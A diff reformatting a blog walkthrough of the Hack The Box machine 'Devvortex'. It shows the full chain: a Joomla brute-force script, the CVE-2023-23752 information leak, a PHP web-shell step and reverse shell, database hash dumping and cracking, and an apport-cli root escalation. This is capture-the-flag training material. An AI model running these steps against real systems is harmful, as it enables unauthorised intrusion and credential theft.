@@ -26,8 +26,7 @@ Time to jump two feet in the the Devvortex!
 
 Let's get the services running with good, ol' nmap.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.242
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 00:46 AEST
@@ -57,16 +56,18 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 26.61 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Add the devvortex.htb from the title to the /etc/hosts file.
 
-{% raw %}
-```bash
+{% capture catetchosts %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
-└─$ cat /etc/hosts              
+└─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture etchosts %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.11.242    devvortex.htb
@@ -76,14 +77,16 @@ Add the devvortex.htb from the title to the /etc/hosts file.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetchosts %}
+
+{% include codebox.html title="/etc/hosts" content=etchosts %}
 
 <br />
 Run curl -I to pull the headers to try to identify technologies.
 
-{% raw %}
-```bash
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ curl -I http://devvortex.htb
 HTTP/1.1 200 OK
@@ -95,8 +98,8 @@ Last-Modified: Tue, 12 Sep 2023 17:45:54 GMT
 Connection: keep-alive
 ETag: "6500a3d2-4680"
 Accept-Ranges: bytes
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -110,8 +113,7 @@ Check the landing page the webserver is serving.
 <br />
 Check the landing page source code.
 
-{% raw %}
-```html
+{% capture landingsource %}
 <!DOCTYPE html>
 <html>
 
@@ -146,8 +148,8 @@ Check the landing page source code.
 <snip>
 
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://devvortex.htb' content=landingsource %}
 
 <br />
 Check for the robots.txt file.
@@ -161,8 +163,7 @@ Check for the robots.txt file.
 <br />
 Ffuf the website looking for directories.
 
-{% raw %}
-```bash
+{% capture ffuf %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://devvortex.htb/FUZZ -e .txt,.bak,.html -fw 6791
 
@@ -196,14 +197,13 @@ do.html                 [Status: 200, Size: 7603, Words: 2436, Lines: 255, Durat
 portfolio.html          [Status: 200, Size: 6845, Words: 2083, Lines: 230, Duration: 212ms]
 js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 206ms]
 :: Progress: [882236/882236] :: Job [1/1] :: 175 req/sec :: Duration: [1:29:16] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffuf %}
 
 <br />
 Ffuf for subdomains.
 
-{% raw %}
-```bash
+{% capture ffufsub %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -fw 4
 
@@ -231,16 +231,18 @@ ________________________________________________
 
 dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 243ms]
 :: Progress: [114441/114441] :: Job [1/1] :: 174 req/sec :: Duration: [0:10:10] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffufsub %}
 
 <br />
 Add the dev subdomain to the /etc/hosts.
 
-{% raw %}
-```bash
+{% capture catdevetchosts %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
-└─$ cat /etc/hosts              
+└─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture devetchosts %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.11.242    devvortex.htb dev.devvortex.htb
@@ -250,14 +252,16 @@ Add the dev subdomain to the /etc/hosts.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catdevetchosts %}
+
+{% include codebox.html title="/etc/hosts" content=devetchosts %}
 
 <br />
 Curl the new subdomain like we did before to fingerprint the tech.
 
-{% raw %}
-```bash
+{% capture curlidev %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ curl -I http://dev.devvortex.htb
 HTTP/1.1 200 OK
@@ -273,8 +277,8 @@ Expires: Wed, 17 Aug 2005 00:00:00 GMT
 Last-Modified: Sat, 31 May 2025 14:59:41 GMT
 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
 Pragma: no-cache
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curlidev %}
 
 <br />
 Check the landing page for the new dev subdomain.
@@ -288,8 +292,7 @@ Check the landing page for the new dev subdomain.
 <br />
 Check the source code for the landing page.
 
-{% raw %}
-```html
+{% capture devsource %}
 <!DOCTYPE html>
 <html lang="en">
 
@@ -325,14 +328,13 @@ Check the source code for the landing page.
 <snip>
 
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://dev.devvortex.htb' content=devsource %}
 
 <br />
 Look and see if there is a robots.txt file.
 
-{% raw %}
-```bash
+{% capture robots %}
 # If the Joomla site is installed within a folder
 # eg www.example.com/joomla/ then the robots.txt file
 # MUST be moved to the site root
@@ -362,8 +364,8 @@ Disallow: /logs/
 Disallow: /modules/
 Disallow: /plugins/
 Disallow: /tmp
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='http://dev.devvortex.htb/robots.txt' content=robots %}
 
 <br />
 Check the /administrator/ directory that is listed in the robots.txt.  Notice the Joomla! installation.
@@ -377,8 +379,7 @@ Check the /administrator/ directory that is listed in the robots.txt.  Notice th
 <br />
 Run joomscan to try and determine the version.
 
-{% raw %}
-```bash
+{% capture joomscan %}
     ____  _____  _____  __  __  ___   ___    __    _  _ 
    (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
   .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
@@ -445,8 +446,8 @@ http://dev.devvortex.htb/tmp/
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
 Your Report : reports/dev.devvortex.htb/
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=joomscan %}
 
 <br />
 Check the login request in the Burp to see the structure.
@@ -470,8 +471,7 @@ Search the GitHub for a Joomla brute-forcer.
 <br />
 Download the brute-force script.
 
-{% raw %}
-```bash
+{% capture downloadjoomlabrute %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ wget https://raw.githubusercontent.com/ajnik/joomla-bruteforce/refs/heads/master/joomla-brute.py --inet4-only
 --2025-06-01 01:39:11--  https://raw.githubusercontent.com/ajnik/joomla-bruteforce/refs/heads/master/joomla-brute.py
@@ -488,20 +488,19 @@ joomla-brute.py                                            100%[================
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ chmod +x joomla-brute.py
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadjoomlabrute %}
 
 <br />
 Run the code and notice the result.
 
-{% raw %}
-```bash
+{% capture runjoomlabrute %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ sudo ./joomla-brute.py -u http://dev.devvortex.htb -w /usr/share/wordlists/rockyou.txt -usr admin
 [sudo] password for kali: 
  admin:123456
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runjoomlabrute %}
 
 <br />
 Test the credentials and fail miserably.
@@ -515,8 +514,7 @@ Test the credentials and fail miserably.
 <br />
 Create a script to brute-force the password since the pre-built didn't work.
 
-{% raw %}
-```python
+{% capture brute00 %}
 import requests
 from bs4 import BeautifulSoup
 
@@ -554,8 +552,8 @@ with open('/usr/share/wordlists/rockyou.txt','r') as fs:
             print(f'[*] The password is: {passwd}')
             break
 print('[*] Execution Finished')
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='htb-devvortex_0x00.py' content=brute00 %}
 
 <br />
 Look-up the Joomla version in the Google looking for an exploit and find this CVE.
@@ -570,18 +568,16 @@ Look-up the Joomla version in the Google looking for an exploit and find this CV
 <br />
 Initiate the script.
 
-{% raw %}
-```bash
+{% capture initpy %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex/CVE-2023-23752]
 └─$ python3 joomla.py
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=initpy %}
 
 <br />
 Run the script and get some credentials.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
 ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
@@ -615,8 +611,8 @@ IP/Domain: dev.devvortex.htb
 [+] Hostname          : localhost
 [+] Username          : lewis
 [+] Password          : P4ntherg0t1n5r3c0n##
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Use the credentials to login to the Joomla installation.
@@ -630,8 +626,7 @@ Use the credentials to login to the Joomla installation.
 <br />
 Try to SSH using the password to test for password reuse.
 
-{% raw %}
-```bash
+{% capture tryssh %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex/CVE-2023-23752]
 └─$ ssh lewis@10.10.11.242                    
 The authenticity of host '10.10.11.242 (10.10.11.242)' can't be established.
@@ -649,8 +644,8 @@ lewis@10.10.11.242's password:
 root@10.10.11.242's password: 
 Permission denied, please try again.
 root@10.10.11.242's password:
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=tryssh %}
 
 <br />
 Navigate to the Cassiopeia error.php.
@@ -683,14 +678,13 @@ Use ls to test the remote code execution.
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture start443listener %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ sudo rlwrap nc -nlvp 443                                 
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start443listener %}
 
 <br />
 Use the revshells to get a payload for our parameter.
@@ -714,8 +708,7 @@ Re-add the one-liner to the error.php file like before.  Use the revshells paylo
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ sudo rlwrap nc -nlvp 443                                 
 [sudo] password for kali: 
@@ -723,14 +716,13 @@ listening on [any] 443 ...
 connect to [10.10.16.5] from (UNKNOWN) [10.10.11.242] 40662
 www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ python3 -c 'import pty; pty.spawn("/bin/bash");'
 <a$ python3 -c 'import pty; pty.spawn("/bin/bash");'
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Check the configuration file.
 
-{% raw %}
-```php
+{% capture configurationphp %}
 <?php
 class JConfig {
         public $offline = false;
@@ -797,14 +789,13 @@ class JConfig {
         public $session_metadata = true;
 
         <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='php' title='configuration.php' content=configurationphp %}
 
 <br />
 Enumerate the database with the lewis credentials to get the logan hash.
 
-{% raw %}
-```bash
+{% capture enumdb %}
 www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
 mysql -u lewis -p
 Enter password: P4ntherg0t1n5r3c0n##
@@ -866,94 +857,29 @@ select username, password from sd4fg_users;
 mysql> exit
 exit
 Bye
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=enumdb %}
 
 <br />
 Save the logan credentials to a file.
 
-{% raw %}
-```bash
+{% capture catpassestxt %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
-└─$ cat passes.txt              
+└─$ cat passes.txt 
+{% endcapture %}
+
+{% capture passestxt %}
 logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catpassestxt %}
+
+{% include codebox.html title="passes.txt" content=passestxt %}
 
 <br />
 Use jonn to crack the password.
 
-{% raw %}
-```bash
-www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
-mysql -u lewis -p
-Enter password: P4ntherg0t1n5r3c0n##
-
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 2661
-Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)
-
-Copyright (c) 2000, 2023, Oracle and/or its affiliates.
-
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-mysql> show databases;
-show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| joomla             |
-| performance_schema |
-+--------------------+
-3 rows in set (0.00 sec)
-
-mysql> use joomla;
-use joomla;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-mysql> show tables;
-show tables;
-
-<snip>
-
-mysql> select * from sd4fg_users;
-select * from sd4fg_users;
-+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
-| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
-+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
-| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-06-01 14:58:10 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
-| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
-+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
-2 rows in set (0.00 sec)
-
-mysql> select username, password from sd4fg_users;
-select username, password from sd4fg_users;
-+----------+--------------------------------------------------------------+
-| username | password                                                     |
-+----------+--------------------------------------------------------------+
-| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
-| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
-+----------+--------------------------------------------------------------+
-2 rows in set (0.00 sec)
-
-mysql> exit
-exit
-Bye
-```
-{% endraw %}
-
-<br />
-Save the logan credentials to a file.
-
-{% raw %}
-```bash
+{% capture crackloganpassword %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt passes.txt 
 Using default input encoding: UTF-8
@@ -965,14 +891,13 @@ tequieromucho    (logan)
 1g 0:00:00:07 DONE (2025-06-02 01:07) 0.1254g/s 176.1p/s 176.1c/s 176.1C/s lacoste..harry
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=crackloganpassword %}
 
 <br />
 Ssh into the machine with the Logan credentials.
 
-{% raw %}
-```bash
+{% capture sshlogan %}
 ┌──(kali㉿kali)-[~/Documents/htb/devvortex]
 └─$ ssh logan@10.10.11.242
 logan@10.10.11.242's password: 
@@ -1005,14 +930,13 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23
 logan@devvortex:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshlogan %}
 
 <br />
 Run sudo -l to get a list of commands that we can run as sudo.
 
-{% raw %}
-```bash
+{% capture sudol %}
 logan@devvortex:~$ sudo -l
 [sudo] password for logan: 
 Matching Defaults entries for logan on devvortex:
@@ -1020,8 +944,8 @@ Matching Defaults entries for logan on devvortex:
 
 User logan may run the following commands on devvortex:
     (ALL : ALL) /usr/bin/apport-cli
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Google apport-cli and come up with CVE-2023-1326.
@@ -1035,8 +959,7 @@ Google apport-cli and come up with CVE-2023-1326.
 <br />
 Follow the steps listed in the Medium article and get root.
 
-{% raw %}
-```bash
+{% capture apportprivescexploit %}
 logan@devvortex:~$ sudo /usr/bin/apport-cli --file-bug
 
 *** What kind of problem do you want to report?
@@ -1117,14 +1040,13 @@ What would you like to do? Your options are:
 Please choose (S/V/K/I/C): V
 # whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=apportprivescexploit %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 # cat /home/logan/user.txt
 <redacted>
 # ip a
@@ -1136,14 +1058,13 @@ Get the user.txt flag.
     link/ether 00:50:56:95:0b:cf brd ff:ff:ff:ff:ff:ff
     inet 10.10.11.242/23 brd 10.10.11.255 scope global eth0
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt
 <redacted>
 # ip a
@@ -1155,8 +1076,8 @@ Get the root.txt flag.
     link/ether 00:50:56:95:0b:cf brd ff:ff:ff:ff:ff:ff
     inet 10.10.11.242/23 brd 10.10.11.255 scope global eth0
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that, we quelled the devnado that is devvortex!  I hope you enjoyed the read.  See you in the next one.
